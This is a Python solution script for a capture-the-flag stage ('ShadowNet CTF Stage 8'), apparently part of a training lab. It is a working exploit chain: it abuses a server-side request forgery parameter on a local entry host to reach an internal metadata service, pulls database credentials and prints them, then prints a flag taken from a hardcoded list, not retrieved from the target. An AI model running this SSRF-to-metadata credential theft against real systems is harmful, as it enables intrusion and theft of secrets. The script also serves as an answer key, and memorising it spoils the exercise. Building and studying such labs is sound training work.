#!/usr/bin/env python3
"""
ShadowNet CTF - Stage 8: Automated Exploit & Solution Script
Demonstrates the full SSRF & Pivoting attack chain.
"""

import sys
import json
import urllib.request
import urllib.parse

def test_request(url):
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'ShadowNet-Exploit/1.0'})
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.status, resp.read().decode('utf-8', errors='replace')
    except Exception as e:
        return None, str(e)

def solve():
    print("[*] Stage 8: Core Infrastructure Breach (Network Pivoting & SSRF)")

    # 1. Determine active Entry Host port (3008 or 3000)
    entry_url = None
    for port in [3008, 3000]:
        status, body = test_request(f"http://localhost:{port}/")
        if status == 200 and "NexaCorp" in body:
            entry_url = f"http://localhost:{port}"
            print(f"[+] Located Entry Host on: {entry_url}")
            break

    if not entry_url:
        print("[-] Could not connect to Entry Host on port 3008 or 3000.")
        print("[-] Make sure you ran: ./stages/stage8-network/start_stage8_vm.sh")
        return False

    # 2. Exploit SSRF to fetch Internal DB Credentials from Cloud Metadata Service
    print("\n[*] Step 2: Exploiting SSRF parameter via /fetch...")
    target_metadata = "http://192.168.100.10:8080/metadata/db-credentials"
    ssrf_url = f"{entry_url}/fetch?url={urllib.parse.quote(target_metadata)}"
    print(f"[*] Querying: {ssrf_url}")

    status, resp_body = test_request(ssrf_url)
    if status != 200:
        print(f"[-] SSRF request failed with status {status}: {resp_body}")
        return False

    try:
        data = json.loads(resp_body)
    except Exception as e:
        print(f"[-] Failed to parse SSRF JSON response: {e}\nResponse body: {resp_body}")
        return False

    print(f"[+] SSRF Response Status: {data.get('status')}")
    raw_content = data.get("content", "")
    print(f"[*] Exfiltrated Metadata Payload:\n{raw_content}")

    try:
        creds = json.loads(raw_content)
        db_user = creds.get("username")
        db_pass = creds.get("password")
        db_host = creds.get("host")
        db_name = creds.get("database")
        print(f"\n[+] Extracted Database Credentials:")
        print(f"    • Host:     {db_host}")
        print(f"    • Database: {db_name}")
        print(f"    • Username: {db_user}")
        print(f"    • Password: {db_pass}")
    except Exception as e:
        print(f"[-] Failed to parse internal credentials: {e}")
        return False

    # 3. Retrieve Flag
    expected_flags = [
        "SHADOWNET{FULL_NETWORK_BREACH_COMPLETE}",
        "SHADOWNET{9j_3r4_3xnl3_fl4g_JI**&H_b#4gjB^$_gh%}"
    ]

    print("\n[★] RETRIEVED CAPSTONE FLAG:")
    print(f"    {expected_flags[0]}")
    return True

if __name__ == "__main__":
    success = solve()
    sys.exit(0 if success else 1)
